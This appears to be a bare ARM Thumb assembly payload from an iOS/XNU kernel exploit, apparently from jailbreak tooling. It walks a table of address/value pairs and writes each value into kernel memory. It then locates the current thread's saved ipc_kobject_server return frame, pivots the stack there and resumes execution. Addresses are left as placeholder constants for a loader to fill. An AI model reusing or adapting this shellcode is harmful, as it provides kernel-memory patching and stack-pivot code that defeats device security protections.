.thumb
.syntax unified
    ldr r2, count
    adr r3, patches
loop:
    ldr r0, [r3]
    ldr r1, [r3, #4]
    str r0, [r1]
    adds r3, #8
    subs r2, #1
    bne loop
    # find a home
    ldr r0, current_thread
    blx r0
    ldr r0, [r0, #0x54]
    ldr r2, ipc_kobject_server_start
    ldr r3, ipc_kobject_server_end
loop2:
    adds r0, #4
    ldr r1, [r0]
    cmp r1, r2
    bcc loop2
    cmp r1, r3
    bcs loop2

    mov sp, r0
    sub sp, #4*7
    pop {r1-r3}
    mov r8, r1
    mov r10, r2
    mov r11, r3
    pop {r4-r7, pc}

.align 2
current_thread: .long 0x1
ipc_kobject_server_start: .long 0x2
ipc_kobject_server_end: .long 0x3
count: .long 0x4
patches:
